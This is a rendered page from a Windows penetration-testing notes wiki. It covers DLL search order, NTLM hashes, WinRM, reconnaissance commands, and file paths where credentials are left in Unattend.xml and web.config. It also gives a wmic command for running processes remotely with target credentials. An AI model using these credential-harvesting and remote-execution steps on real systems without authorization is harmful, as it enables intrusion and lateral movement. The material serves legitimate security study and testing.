<h3 id="dlls">DLLs<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#dlls" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="windows-dll-search-order" data-block data-embed-alias="undefined"><h1>Windows DLL search order</h1><p>The search order varies depending on the state of SafeDllSearchMode.</p>
<p><a href="../spells/windows-dll-search-order/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> DLL search order if SafeDllSearchMode is enabled:</p>
<ul>
<li>The application directory</li>
<li>The system directory (as returned by <code>GetSystemDirectory()</code>)</li>
<li>The 16-bit (!) system directory</li>
<li>The Windows directory (as returned by <code>GetWindowsDirectory()</code>)</li>
<li>The current directory (!)</li>
<li>The system PATH (!)</li>
</ul>
<p><a href="../spells/windows-dll-search-order/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> DLL search order if SafeDllSearchMode is disabled:</p>
<ul>
<li>The application directory</li>
<li>The current directory (!)</li>
<li>The system directory (as returned by <code>GetSystemDirectory()</code>)</li>
<li>The 16-bit (!) system directory</li>
<li>The Windows directory (as returned by <code>GetWindowsDirectory()</code>)</li>
<li>The system PATH (!)</li>
</ul>
<p>Note that it seems more-or-less impossible to determine what DLLs an application is searching for without having SYSTEM access already (so tools like ProcMon can be run).</p><a href="../spells/windows-dll-search-order" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="ntlm-hashes">NTLM hashes<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#ntlm-hashes" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="ntlm-hashes" data-block data-embed-alias="undefined"><h1>NTLM hashes</h1><p>The <a href="../spellbook/ntlm-hashes/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> NT family uses NTLM for (network) logins, and stores hashes in the NT hash format, which is really just the md4 hash of the UTF-16-LE encoding of the user password (UTF-16-LE is the little endian version of UTF-16). While NTLM is the login protocol, people commonly call NT hashes “NTLM” hashes.</p>
<p>The “LM” in “NTLM” references the pre-NT password hashing mechanism, LM. <a href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4" class="external" target="_blank">LM hashes are constructed in an absolutely batshit crazy fashion<svg class="external-icon" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a>, and are <em>much</em> weaker than (the already weak) NT hashes.</p>
<p><a href="../spellbook/ntlm-hashes/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> passwords are stored in the SAM, but NT and LM hashes (which can coexist on the same system) are stored in different data structures.</p><a href="../spellbook/ntlm-hashes" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="winrm">WinRM<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#winrm" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="windows-remote-management" data-block data-embed-alias="undefined"><h1>Windows remote management</h1><p><a href="../spells/windows-remote-management/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> Remote Management (WinRM) is basically <a href="../spells/windows-remote-management/../../spellbook/powershell" class="internal alias" data-slug="spellbook/powershell">PowerShell</a>-over-<a href="../spells/windows-remote-management/../../spellbook/http" class="internal alias" data-slug="spellbook/http">HTTP</a>. It requires access to <a href="../spells/windows-remote-management/../../spellbook/tcp" class="internal alias" data-slug="spellbook/tcp">TCP</a> 5985 (unencrypted) or <a href="../spells/windows-remote-management/../../spellbook/tcp" class="internal alias" data-slug="spellbook/tcp">TCP</a> 5986 (encrypted).</p><a href="../spells/windows-remote-management" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h2 id="reconnaissance">Reconnaissance<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#reconnaissance" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="important-commands">Important commands<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#important-commands" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="useful-built-in-commands-for-windows-reconnaissance" data-block data-embed-alias="undefined"><h1>Useful built-in commands for Windows reconnaissance</h1><ul>
<li><code>arp -a</code> — display the <a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spellbook/arp" class="internal alias" data-slug="spellbook/arp">ARP</a> cache (find other machines on the network!)</li>
<li><code>cmdkey /list</code> — show saved credentials</li>
<li><code>driverquery</code> — list installed drivers</li>
<li><code>hostname</code> — return system hostname</li>
<li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spellbook/net" class="internal alias" data-slug="spellbook/net">net accounts</a> — local machine policies</li>
<li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spellbook/net" class="internal alias" data-slug="spellbook/net">net accounts /domain</a> — domain policies</li>
<li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spellbook/net" class="internal alias" data-slug="spellbook/net">net group</a> — list domain groups</li>
<li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spellbook/net" class="internal alias" data-slug="spellbook/net">net group “Domain Admins” /domain</a> — list domain admins</li>
<li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spellbook/net" class="internal alias" data-slug="spellbook/net">net localgroup</a> — list all (local) groups</li>
<li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spellbook/net" class="internal alias" data-slug="spellbook/net">net localgroup administrators</a> — list local admins</li>
<li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spellbook/net" class="internal alias" data-slug="spellbook/net">net share</a> — list all shares (made available by the current machine)</li>
<li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spellbook/net" class="internal alias" data-slug="spellbook/net">net start</a> — list all running services (lots!)</li>
<li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spellbook/net" class="internal alias" data-slug="spellbook/net">net user</a> — list all (local) users</li>
<li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spellbook/net" class="internal alias" data-slug="spellbook/net">net user ＄USERNAME</a> — get details for user <code>$USERNAME</code></li>
<li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spells/netstat" class="internal" data-slug="spells/netstat">netstat</a> — query open/listening ports</li>
<li><code>query session</code> — list other users who are currently logged in</li>
<li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spells/reg" class="internal" data-slug="spells/reg">reg</a> — query (and manipulate) registry entries</li>
<li><code>sc</code> — query (and manipulate) services (conflicts with a <a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spellbook/powershell" class="internal alias" data-slug="spellbook/powershell">PowerShell</a> built-in!)</li>
<li><code>schtasks</code> — list scheduled tasks</li>
<li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spells/systeminfo" class="internal" data-slug="spells/systeminfo">systeminfo</a> — return system info</li>
<li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spells/whoami" class="internal alias" data-slug="spells/whoami">whoami /groups</a> — list current user’s groups</li>
<li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance/../../spells/whoami" class="internal alias" data-slug="spells/whoami">whoami /priv</a> — current user + privileges</li>
</ul><a href="../spells/useful-built-in-commands-for-windows-reconnaissance" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="permissions-1">Permissions<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#permissions-1" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="icacls" data-block data-embed-alias="undefined"><h1>icacls</h1><p>Use icacls or <code>Get-Acl $PATH | Format-List</code> in <a href="../spells/icacls/../../spellbook/powershell" class="internal alias" data-slug="spellbook/powershell">PowerShell</a> to check permissions at the command line. The icacls tool can also be used to update <a href="../spells/icacls/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> ACLs.</p>
<p>Both of these tools produce output that is somewhat different than that of the “Security” tab in the file or folder properties:</p>
<ul>
<li><code>(I)</code> — permission inherited from the parent container</li>
<li><code>(F)</code> — full access (full control)</li>
<li><code>(M)</code> — modify right/access</li>
<li><code>(OI)</code> — object inherit</li>
<li><code>(IO)</code> — inherit only</li>
<li><code>(CI)</code> — container inherit</li>
<li><code>(RX)</code> — read and execute</li>
<li><code>(AD)</code> — append data (add subdirectories)</li>
<li><code>(WD)</code> — write data and add files</li>
</ul>
<p>Note that the <a href="../spells/icacls/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> File Explorer only displays the <em>first</em> ACL for a particular user or group, but that <a href="../spells/icacls/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> allows <em>multiple</em> ACLs to be applied! This means that the File Explorer does not always show you the <em>actual</em> permissions a user/group will have — you really do need to use icacls or Get-Acl.</p>
<p>In the case of multiple ACLs, or when a user is part of two groups with different groups, keep in mind that allow permissions only override <em>inherited</em> deny permissions. Explicitly set deny permissions <em>cannot</em> be overridden.</p><a href="../spells/icacls" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="querying-the-registry">Querying the registry<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#querying-the-registry" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="reg" data-block data-embed-alias="undefined"><h1>reg</h1><p>The reg binary is used to interact with the <a href="../spells/reg/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> registry from the command line.</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">reg query </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">REGISTRY_PATH</span></span></code></pre></figure>
<p>Registry paths will typically start with HKLM (HKey Local Machine), HKCU (HKey Current User), etc.</p><a href="../spells/reg" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="netstat">netstat<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#netstat" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="netstat" data-block data-embed-alias="undefined"><h1>netstat</h1><p>The netstat command is found on both <a href="../spells/netstat/../../spellbook/linux" class="internal alias" data-slug="spellbook/linux">Linux</a> and <a href="../spells/netstat/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a>, though the two versions have slightly different options.</p>























































<div class="table-container"><table><thead><tr><th style="text-align:right;">Linux</th><th style="text-align:right;">Windows</th><th style="text-align:left;">Description</th></tr></thead><tbody><tr><td style="text-align:right;"><code>-a</code></td><td style="text-align:right;"><code>-a</code></td><td style="text-align:left;">Shows all sockets (listening and established)</td></tr><tr><td style="text-align:right;"><code>-i</code></td><td style="text-align:right;"></td><td style="text-align:left;">Shows per interface statistics</td></tr><tr><td style="text-align:right;"><code>-l</code></td><td style="text-align:right;"></td><td style="text-align:left;">Show <em>only</em> listening ports</td></tr><tr><td style="text-align:right;"><code>-n</code></td><td style="text-align:right;"><code>-n</code></td><td style="text-align:left;">Do <em>not</em> resolve IP addresses or port numbers</td></tr><tr><td style="text-align:right;"><code>-p</code></td><td style="text-align:right;"><code>-ob</code></td><td style="text-align:left;">Show PID and binary using the socket (needs root)</td></tr><tr><td style="text-align:right;"><code>-s</code></td><td style="text-align:right;"></td><td style="text-align:left;">Show protocol statistics</td></tr><tr><td style="text-align:right;"><code>-t</code></td><td style="text-align:right;"><code>-p TCP</code></td><td style="text-align:left;">Show <a href="../spells/netstat/../../spellbook/tcp" class="internal alias" data-slug="spellbook/tcp">TCP</a> sockets only</td></tr><tr><td style="text-align:right;"><code>-u</code></td><td style="text-align:right;"><code>-p UDP</code></td><td style="text-align:left;">Show <a href="../spells/netstat/../../spells/udp" class="internal alias" data-slug="spells/udp">UDP</a> sockets only</td></tr><tr><td style="text-align:right;"><code>-x</code></td><td style="text-align:right;"></td><td style="text-align:left;">Show UNIX sockets (kernel-only “network”) only</td></tr></tbody></table></div>
<p>On <a href="../spells/netstat/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a>, if you know the PID of a process, you can use netstat + <a href="../spells/netstat/../../spells/findstr" class="internal" data-slug="spells/findstr">findstr</a> to quickly find out what ports its listening on:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">netstat </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">-</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">noa </span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">|</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> findstr </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">LISTENING</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> |</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> findstr </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;">PID</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span></span></code></pre></figure><a href="../spells/netstat" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="systeminfo">systeminfo<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#systeminfo" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="systeminfo" data-block data-embed-alias="undefined"><h1>systeminfo</h1><p>The <a href="../spells/systeminfo/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> systeminfo command displays <em>a lot</em> of information! Use <a href="../spells/systeminfo/../../spells/findstr" class="internal" data-slug="spells/findstr">findstr</a> to filter its output:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">systeminfo </span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">|</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> findstr </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">B </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">C:</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">OS Name</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">                        /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">C:</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">OS Version</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">                        /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">C:</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">System Type</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span></span></code></pre></figure>
<p>This can be used to semi-reliably determine if a machine is part of a domain.</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">systeminfo </span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">|</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> findstr Domain</span></span></code></pre></figure>
<p>(Non-AD joined machines will almost always use WORKGROUP for the <code>Domain</code>, while AD-joined machines will often use a fully qualified DNS domain here.)</p><a href="../spells/systeminfo" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="potentially-interesting-files">Potentially interesting files<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#potentially-interesting-files" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<h4 id="powershell-history">PowerShell history<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#powershell-history" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<p></p><blockquote class="transclude" data-url="powershell-history-file" data-block data-embed-alias="undefined"><h1>PowerShell history file</h1><p>View <a href="../spells/powershell-history-file/../../spellbook/powershell" class="internal alias" data-slug="spellbook/powershell">PowerShell</a>’s history.</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">type </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#998418;--shiki-dark:#998418;">Env:</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">USERPROFILE</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span></span></code></pre></figure>
<p>Use %USERPROFILE% instead of <code>$Env:USERPROFILE</code> if running from cmd.exe.</p><a href="../spells/powershell-history-file" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h4 id="unattended-windows-installation-data">Unattended Windows installation data<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#unattended-windows-installation-data" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<p></p><blockquote class="transclude" data-url="windows-unattended-installation-data" data-block data-embed-alias="undefined"><h1>Windows unattended installation data</h1><p>Unattended <a href="../spells/windows-unattended-installation-data/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> installations still need an administrative account; credentials can be left in one of the following files (if not cleaned up):</p>
<ul>
<li><code>C:\Unattend.xml</code></li>
<li><code>C:\Windows\Panther\Unattend.xml</code></li>
<li><code>C:\Windows\Panther\Unattend\Unattend.xml</code></li>
<li><code>C:\Windows\system32\sysprep.inf</code></li>
<li><code>C:\Windows\system32\sysprep\sysprep.xml</code></li>
</ul>
<p>Look for the <code>&lt;Credentials/></code> block.</p><a href="../spells/windows-unattended-installation-data" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h4 id="iis-configuration-data">IIS configuration data<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#iis-configuration-data" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<p></p><blockquote class="transclude" data-url="iis-configuration-data" data-block data-embed-alias="undefined"><h1>IIS configuration data</h1><p>Placed where IIS stores passwords:</p>
<ul>
<li><code>C:\inetpub\wwwroot\web.config</code></li>
<li><code>C:\Windows\Microsoft.NET\Framework64\$SOME_VERSION_STRING\Config\web.config</code></li>
</ul>
<p>Look for the <code>connectionString</code> directive.</p><a href="../spells/iis-configuration-data" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="wmic">wmic<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#wmic" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="wmic" data-block data-embed-alias="undefined"><h1>wmic</h1><p>The wmic command on <a href="../spellbook/wmic/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> is extremely useful, but is also deprecated (<em>because</em> of its usefulness to attackers!). It can be used on <a href="../spellbook/wmic/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> 10 21H1 and earlier. For later systems, <a href="../spellbook/wmic/../../spellbook/powershell" class="internal alias" data-slug="spellbook/powershell">PowerShell</a> command-lets will need to be used instead (which increases the risk that activity will be logged).</p>
<ul>
<li><code>wmic product get name,version,vendor</code> — list all installed software (but misses 32-bit applications installed on a 64-bit OS)</li>
<li><code>wmic service get name,displayname,pathname,startmode</code> — list all services</li>
<li><code>wmic qfe get caption,description,hotfixid,installedon</code> — list installed updates</li>
<li><code>wimc service list brief</code> — another way of listing services</li>
<li><code>wmic service where &quot;name like '$SERVICE_NAME'&quot; get name,pathname</code> — get information about a particular service</li>
<li><code>wmic /namespace:\root\securitycenter2 path antivirusproduct</code> — enumerate antivirus</li>
<li><code>wmic useraccount get name,sid</code> — Display SIDs for all (local) users</li>
</ul>
<h2 id="remote-process-creation">Remote process creation<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#remote-process-creation" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="how-to-run-a-remote-command-with-wmic" data-block data-embed-alias="undefined"><h1>How to run a remote command with wmic</h1><figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">wmic.exe</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">user:</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_USER</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">         /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">password:</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_PASSWORD</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">         /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">node:</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_HOST</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#1E754F;--shiki-dark:#1E754F;">    process</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> call create </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">SOME_COMMAND</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span></span></code></pre></figure><a href="../spellbook/wmic/../../spells/how-to-run-a-remote-command-with-wmic" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h2 id="install-an-msi-package">Install an MSI package<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#install-an-msi-package" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
